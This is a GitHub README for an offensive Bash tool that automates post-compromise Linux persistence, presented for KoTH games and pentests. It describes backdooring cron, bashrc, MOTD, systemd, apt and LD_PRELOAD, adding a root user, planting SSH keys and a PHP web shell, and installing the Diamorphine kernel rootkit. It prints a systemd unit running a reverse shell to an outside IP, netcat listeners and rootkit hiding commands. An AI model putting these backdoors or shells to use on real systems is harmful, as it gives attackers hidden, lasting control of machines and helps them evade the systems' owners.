


<h1 align="center">DynastyPersist 1.5</h1>

<div align="center">
  DynastyPersist: A streamlined tool for achieving Linux persistence effortlessly.<br>
  Supports <b><i>KoTH, Battlegrounds and Pentest Operations</i></b><br>
   <br>
  <img alt="GitHub License" src="https://img.shields.io/github/license/Trevohack/DynastyPersist?style=for-the-badge&labelColor=blue&color=violet">
  <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/Trevohack/DynastyPersist?style=for-the-badge&labelColor=blue&color=violet">
  <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?style=for-the-badge&logo=linux&logoColor=black&labelColor=blue">
  <img alt="Static Badge" src="https://img.shields.io/badge/Bash-violet?style=for-the-badge&logo=gnubash&logoColor=black&labelColor=blue">
  <p></p>
    <a href="https://github.com/Trevohack/DynastyPersist?tab=readme-ov-file#installation">Install</a>
  <span> • </span>
       	<a href="https://github.com/Trevohack/DynastyPersist?tab=readme-ov-file#documentation">Documentation</a>
  <span> • </span>
	<a href="https://github.com/Trevohack/DynastyPersist?tab=readme-ov-file#usage">Usage</a>
  <p></p>
</div>

![image](https://github.com/Trevohack/DynastyPersist/assets/136177431/0abde422-ce91-4aa5-b0a2-f0ed45a9ca23)



## Documentation

### [ FEATURES ]

| Features | Description |
| :-------- | :-------   | 
| **SSH Key Generation** |  Automatically generates SSH keys for covert access.  |
| **Cronjob Persistence** | Sets up cronjobs for scheduled persistence. |
| **Custom User with Root** | Creates a custom user with root privileges. |
| **RCE Persistence** | Achieves persistence through remote code execution |
| **LKM/Rootkit** | Demonstrates Linux Kernel Module (LKM) based rootkit persistence. | 
| **Bashrc Persistence** | Modifies user-specific shell initialization files for persistence (aliases / reverse shells). |
| **Systemd Service for Root** | Sets up a systemd service for achieving root persistence. |
| **LD_PRELOAD Privilege Escalation Config** | Configures LD_PRELOAD for privilege escalation. |
| **Backdooring Message of the Day / Header** | Backdoors system message display for covert access. |
| **Modify an Existing Systemd Service** | Manipulates an existing systemd service for persistence. |
| **Backdoors APT Command** | Backdoors `apt` command to pop up a shell. |

###  [ Modules ]

#### SSH Key Generation

* Gain access to a server using `ssh` key generation. This module creates an `id_rsa` key for every user. Which can be used for reverse access. After, running this module the attacker can connect to the server via `ssh`.

* This can be manually done using the `ssh-keygen` command. However, the module creates a private key for every user in no time. 

```bash
root@kali ~ ssh -i id_rsa root@10.10.110.101
``` 

* Module Number: `1`

#### Cronjob Persistence 

* Cronjobs in Linux are scheduled tasks that run automatically at specified intervals.

* One of the most efficient modules, that involves reverse shells. This module directly writes reverse shell commands to `/etc/crontab`. Which will pop up a shell in the port you listening to. 

```bash
root@kali ~ nc -nvlp 9999
``` 

* Module Number: `2` 

#### Custom User With Root

* A simple and fast method to gain reverse access. Simply, this module creates another user with root access. Later on, the attacker can login to the user via `ssh`.

```bash
root@kali ~ ssh newuser@10.10.110.101
``` 

* Module Number: `3` 

#### RCE Persistence 

* This module, comes with a `php` script that is hosted in the web root directory. The script is located in `/var/www/html/dynasty_rce/rce.php`. Further, the prefix `dynasty_rce` can be hidden if the `LKM` module is run before. 

* Visiting `victim_ip:port/dynasty_rce/rce.php` will give you the power to run commands within the shell. 

* Module Number: `4`

#### LKM Rootkit

* An advanced persistence method, that implants a rootkit to the server's kernel. The program focuses on an open-source `LKM` rootkit called `Diamorphine`. The module is in `/var/tmp/.memory` as a temporary location. This directory is deleted after the module is set up. 
* The below code block shows the uses of this module. 
```bash
victim@ubuntu ~ kill -64 0 # Promtes to root user. 
victim@ubuntu ~ mkdir dynasty_persist # Any directory starting with dynasty will be hidden.
victim@ubuntu ~ kill -31 <process> # Hides processors
victim@ubuntu ~ lsmod | grep -i diamorphine # Hides itself 
victim@ubuntu ~ kill -63 0 # Make it appear in lsmod output
``` 

* Module Number: `5`

#### Bashrc Persistence 

* This module, writes reverse shell commands, aliases, and variables for reverse access. A shell is gifted when a user logs in to the server or the person uses `find` or `cat`.

```bash
root@kali ~ nc -nvlp 9999
``` 

* Module Number: `6`  

#### Systemd Service for Root

* A module that creates a custom service in `systemd` for reverse access. 

* An example: 

```bash
Description=Dynasty Persist

[Service]
ExecStart=sudo bash /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/9999 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target"
``` 

* The above example, will be created as a service. This method is efficient and durable.

* Module Number: `7` 

#### LD_PRELOAD Privilege Escalation Config

* LD_PRELOAD is an environment variable in Linux that allows users to pre-load a shared library before other libraries. Privilege escalation using LD_PRELOAD involves loading a malicious library to intercept and modify system calls, potentially gaining elevated privileges. The module backdoors command like `find` and `wget`.

* Module Number: `8` 

#### Backdooring Message of the Day / Header 

* The "Message of the Day" (MOTD) in Linux is a customizable text displayed to users upon login, providing information or updates about the system. It is typically stored in the /etc/motd file and can be modified by system administrators.

* This module, writes a shell to `/etc/update-motd.d/00-header`. This is typically, triggered when a user logs in.

* Module Number: `9` 

#### Modify An Existing Systemd Service 

* Similar to module `7`, this one modifies an existing service for reverse access. 

* Simply, it rewrites the `ExecStartPre` in the service to a reverse shell command. 

* Module Number: `10` 

#### Backdoor APT

* "APT" stands for Advanced Package Tool, and it's commonly used in Debian-based systems such as Ubuntu. The file will be here: `/etc/apt/apt.conf.d/42backdoor` 

* Backdoors the `apt` command, whenever `apt` is run it'll pop up a shell. 

* Module Number: `11` 


### [ MODES ]

* Currently, there are 2 modes available in the latest update (1.4).

* Modes are `console` and `ctf` which are designed to work in a specific behavior.

* In comparison, the `console` mode comes with more features and stability than the `ctf` mode. 

#### Console 

* `console` mode enters the tool in the usual setup, with all features. These features will run locally on the local host where the script is being executed. Designed for persistence in real-time operations.

* The prefix `use` followed by the module number will be used to run any selected module. Like, `use 1`

* Also, the interface is updated the modules/payloads are now visible when you type `show payloads`. 

* Lastly, the help/options menu is also modified enter `show options` to view it.

#### CTF 

* `ctf` mode is an extra feature to log in to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 

* Runs most of the functions in `console`. 

### [ USAGE ] 

* The syntax to use the tool is described below: 

```bash
$ ./dynasty.sh <lhost> <lport> <mode> 
$ ./dynasty.sh ctf 
$ ./dynasty.sh 10.10.14.3 9999 console 
``` 

## Installation

Via Git
```bash
$ git clone https://github.com/Trevohack/DynastyPersist
$ cd DynastyPersist/src 
``` 

Via Curl 
```bash
$ curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
``` 

## Thank you! 

